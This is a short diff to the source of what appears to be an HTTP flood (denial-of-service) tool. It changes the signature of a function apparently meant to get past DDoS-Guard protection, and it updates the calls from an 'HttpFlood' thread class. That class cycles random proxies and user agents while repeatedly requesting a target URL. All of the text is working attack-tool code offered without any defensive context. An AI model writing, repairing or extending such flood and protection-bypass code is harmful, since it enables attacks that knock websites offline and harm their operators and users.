@@ -190,7 +190,7 @@ class Tools:
         return True
 
     @staticmethod
-    def dgb_solver(url, host, ua, pro=None):
+    def dgb_solver(url, ua, pro=None):
         s = None
         idss = None
         with Session() as s:
@@ -861,7 +861,7 @@ class HttpFlood(Thread):
         with suppress(Exception):
             if self._proxies:
                 pro = randchoice(self._proxies)
-                with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents),pro.asRequest()) as ss:
+                with Tools.dgb_solver(self._target.human_repr(),randchoice(self._useragents),pro.asRequest()) as ss:
                     for _ in range(min(self._rpc, 5)):
                         sleep(min(self._rpc, 5) / 100)
                         with ss.get(self._target.human_repr(),
@@ -872,7 +872,7 @@ class HttpFlood(Thread):
                                 
                 Tools.safe_close(ss)
 
-            with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents)) as ss:
+            with Tools.dgb_solver(self._target.human_repr(),randchoice(self._useragents)) as ss:
                 for _ in range(min(self._rpc, 5)):
                     sleep(min(self._rpc, 5) / 100)
                     with ss.get(self._target.human_repr()) as res:
